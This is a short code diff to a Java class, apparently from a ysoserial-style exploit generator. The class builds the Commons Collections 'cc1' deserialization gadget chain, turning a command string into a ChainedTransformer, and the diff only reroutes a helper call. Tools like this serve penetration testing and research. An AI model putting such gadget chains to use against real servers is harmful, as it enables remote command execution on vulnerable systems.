@@ -4,7 +4,7 @@ import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 import com.qi4l.JYso.gadgets.utils.Reflections;
-import com.qi4l.JYso.gadgets.utils.cc.TransformerUtil;
+
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -50,7 +50,7 @@ public class cc1 implements ObjectPayload<Object> {
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
         // real chain for after setup
-        final Transformer[] transformers = TransformerUtil.makeTransformer(command);
+        final Transformer[] transformers = com.qi4l.JYso.gadgets.utils.Utils.makeTransformer(command);
 
         return get_CC_Sink(transformerChain, transformers);
     }
